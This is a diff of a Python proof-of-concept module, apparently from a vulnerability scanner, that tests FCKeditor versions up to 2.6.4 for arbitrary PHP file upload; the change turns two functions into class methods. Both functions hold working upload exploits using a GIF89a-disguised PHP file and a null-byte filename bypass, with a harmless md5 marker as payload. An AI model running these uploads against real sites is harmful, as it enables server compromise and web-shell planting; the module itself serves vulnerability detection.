@@ -21,66 +21,6 @@ class Vuln(ABVuln):
     product_version = '2.6版本'  # 漏洞应用版本
 
 
-'''
-fckeditor版本 <= 2.4.3
-'''
-
-
-def fck2_4_3(host):
-    hh = hackhttp.hackhttp()
-    path = "/fckeditor2.6/editor/filemanager/upload/php/upload.php?Type=Media"
-    data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
-    data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ssdlh.php\"\r\n"
-    data += "Content-Type: image/jpeg\r\n\r\n"
-    data += "GIF89a<?php print(md5(521521));?>\r\n"
-    data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
-    head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
-    url = host + path
-    code, head, body, ecode, redirect_url = hh.http(
-        url, headers=head, data=data)
-    if code == 200:
-        shell = re.findall("eted\(\d+,\"(.+?.php)\"", body)
-        if shell:
-            phpurl = util.urljoin(host, '../'+shell[0])
-            code, head, body, ecode, redirect_url = hh.http(phpurl)
-            if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
-                #security_hole('upload vulnerable:%s' % phpurl)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
-            # else:
-                #security_info('maybe vulnerable:%s' % phpurl)
-
-
-'''
-fckeditor 版本 介于2.4.3与2.6.4之间（不包括2.4.3）
-'''
-
-
-def fck2_6_4(host):
-    hh = hackhttp.hackhttp()
-    path = "/fckeditor2.6/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=ssdlh.php%00.jpg"
-    data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
-    data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"a.jpg\"\r\n"
-    data += "Content-Type: image/jpeg\r\n\r\n"
-    data += "GIF89a<?php print(md5(521521));?>\r\n"
-    data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
-    head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
-    url = host + path
-    code, head, body, ecode, redirect_url = hh.http(
-        url, headers=head, data=data)
-    if code == 200:
-        shell = re.findall("eted\(\d+,\"(.+?\.php)", body)
-        if shell:
-            phpurl = util.urljoin(host, '../'+shell[0])
-            code, head, body, ecode, redirect_url = hh.http(phpurl)
-            if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
-                #security_hole('upload vulnerable:%s' % phpurl)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
-            # else:
-                #security_info('maybe vulnerable:%s' % phpurl)
-
-
 class Poc(ABPoc):
     poc_id = '18c10a27-c98f-4c5b-bea2-e9b1e80083b8'
     author = '47bwy'  # POC编写者
@@ -101,6 +41,60 @@ class Poc(ABPoc):
             }
         }
 
+    def fck2_4_3(self, host):
+        '''
+        fckeditor版本 <= 2.4.3
+        '''
+        hh = hackhttp.hackhttp()
+        path = "/fckeditor2.6/editor/filemanager/upload/php/upload.php?Type=Media"
+        data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
+        data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ssdlh.php\"\r\n"
+        data += "Content-Type: image/jpeg\r\n\r\n"
+        data += "GIF89a<?php print(md5(521521));?>\r\n"
+        data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
+        head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
+        url = host + path
+        code, head, body, ecode, redirect_url = hh.http(
+            url, headers=head, data=data)
+        if code == 200:
+            shell = re.findall("eted\(\d+,\"(.+?.php)\"", body)
+            if shell:
+                phpurl = host+'../'+shell[0]
+                code, head, body, ecode, redirect_url = hh.http(phpurl)
+                if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
+                    #security_hole('upload vulnerable:%s' % phpurl)
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
+                # else:
+                    #security_info('maybe vulnerable:%s' % phpurl)
+
+    def fck2_6_4(self, host):
+        '''
+        fckeditor 版本 介于2.4.3与2.6.4之间（不包括2.4.3）
+        '''
+        hh = hackhttp.hackhttp()
+        path = "/fckeditor2.6/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=ssdlh.php%00.jpg"
+        data = "------WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
+        data += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"a.jpg\"\r\n"
+        data += "Content-Type: image/jpeg\r\n\r\n"
+        data += "GIF89a<?php print(md5(521521));?>\r\n"
+        data += "------WebKitFormBoundaryba3nn74V35zAYnAT--\r\n"
+        head = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryba3nn74V35zAYnAT\r\n"
+        url = host + path
+        code, head, body, ecode, redirect_url = hh.http(
+            url, headers=head, data=data)
+        if code == 200:
+            shell = re.findall("eted\(\d+,\"(.+?\.php)", body)
+            if shell:
+                phpurl = host+'../'+shell[0]
+                code, head, body, ecode, redirect_url = hh.http(phpurl)
+                if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in body:
+                    #security_hole('upload vulnerable:%s' % phpurl)
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
+                # else:
+                    #security_info('maybe vulnerable:%s' % phpurl)
+
     def verify(self):
         self.target = self.target.rstrip(
             '/') + '/' + (self.get_option('base_path').lstrip('/'))
@@ -108,8 +102,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            fck2_4_3(self.target)
-            fck2_6_4(self.target)
+            self.fck2_4_3(self.target)
+            self.fck2_6_4(self.target)
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
